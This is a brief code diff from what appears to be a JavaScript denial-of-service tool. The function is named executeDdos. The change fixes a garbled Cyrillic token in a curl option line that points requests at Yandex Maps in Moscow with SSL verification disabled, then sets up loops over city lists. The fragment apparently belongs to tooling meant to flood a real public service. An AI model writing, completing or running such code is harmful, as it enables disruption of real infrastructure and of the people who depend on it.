@@ -14,7 +14,7 @@ function executeDdos() {
         const run = () => {
             return new Promise((resolve) => {
                 const curlTest = new Curl();
-                curlTest.setOpt(Curlстою.option.URL, "https://yandex.ru/maps/213/moscow/");
+                curlTest.setOpt(Curl.option.URL, "https://yandex.ru/maps/213/moscow/");
                 curlTest.setOpt(Curl.option.SSL_VERIFYPEER, 0);
                 const cities = [citiesEurope, citiesAfrica, citiesAsia];
 
